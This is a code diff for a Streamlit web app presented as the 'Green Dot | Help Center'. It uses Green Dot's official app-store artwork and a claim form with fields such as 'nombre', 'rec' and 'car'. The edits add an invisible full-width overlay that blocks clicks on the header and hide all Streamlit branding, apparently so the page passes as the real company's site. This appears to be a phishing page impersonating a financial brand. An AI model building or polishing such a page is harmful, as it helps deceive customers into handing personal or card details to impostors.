@@ -23,42 +23,19 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- CSS DE BLOQUEO TOTAL ---
-st.markdown("""<style>
-/* 1. Capa Escudo: Bloquea clics en toda la franja superior (Logo y Título) */
-.stApp::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 250px;
-    z-index: 999999;
-    pointer-events: all;
-    background: transparent;
-}
+# 1. INYECCIÓN DE CAPA FÍSICA (Bloquea clics en toda la cabecera)
+st.markdown("""<div style='position: fixed; top: 0; left: 0; width: 100%; height: 220px; z-index: 9999999; pointer-events: all; background: transparent;'></div>""", unsafe_allow_html=True)
 
-/* 2. Ocultar el icono de anclaje (#) de forma agresiva */
-.section-anchor, 
-a.section-anchor, 
-[data-testid='stHeaderActionElements'], 
-[data-testid='stHeader'], 
-header, 
-footer, 
-.st-emotion-cache-15zrgzn {
+# 2. CSS DE LIMPIEZA EXTREMA
+st.markdown("""<style>
+/* Ocultar elementos de Streamlit */
+[data-testid='stHeader'], header, footer, .stDeployButton, .section-anchor, a.section-anchor, button[title='View fullscreen'] {
     display: none !important;
     visibility: hidden !important;
     opacity: 0 !important;
 }
 
-/* 3. Desactivar interacciones en títulos */
-h1, h2, h3, [data-testid='stMarkdownContainer'] a {
-    pointer-events: none !important;
-    cursor: default !important;
-    text-decoration: none !important;
-}
-
-/* 4. Estética General */
+/* Estética de la App */
 .stApp {
     background-color: #000000 !important;
     color: #FFFFFF !important;
@@ -68,12 +45,19 @@ h1, h2, h3, [data-testid='stMarkdownContainer'] a {
     padding-top: 1rem !important;
 }
 
+/* Desactivar puntero en textos de cabecera */
+h1, h2, h3 {
+    pointer-events: none !important;
+    user-select: none !important;
+}
+
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
     width: 100%;
     padding: 15px !important;
     font-weight: bold !important;
+    border: none !important;
 }
 </style>""", unsafe_allow_html=True)
 
@@ -96,7 +80,7 @@ if submitted:
     if nombre and rec and car:
         st.success("✅ Claim received.")
 
-st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0;'>
+st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0; border: 1px solid #222;'>
     <h2 style='color:white;'>Download the Green Dot app</h2>
     <div style='display: flex; justify-content: center; gap: 20px; margin-top: 20px;'>
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
